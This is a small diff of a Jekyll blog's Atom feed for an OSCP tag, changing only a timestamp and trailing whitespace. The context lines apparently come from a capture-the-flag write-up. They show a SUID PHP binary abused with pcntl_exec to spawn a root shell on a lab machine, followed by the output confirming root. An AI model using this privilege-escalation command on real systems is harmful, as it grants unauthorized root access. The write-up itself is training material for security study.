@@ -4,7 +4,7 @@
   <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
   <link href="/tag/oscp/feed.xml" rel="self" type="application/atom+xml" />
   <link href="/" rel="alternate" type="text/html" />
-  <updated>2020-09-04T23:15:38+00:00</updated>
+  <updated>2020-09-04T23:25:45+00:00</updated>
   <id>/tag/oscp/feed.xml</id>
 
   
@@ -248,7 +248,7 @@ www-data@photographer:/tmp$ /usr/bin/php7.2 -r &quot;pcntl_exec('/bin/sh', ['-p'
 uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
 # whoami
 root
-#                                                                                                                              
+#
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;We have root! Lets grab the flag.&lt;/p&gt;
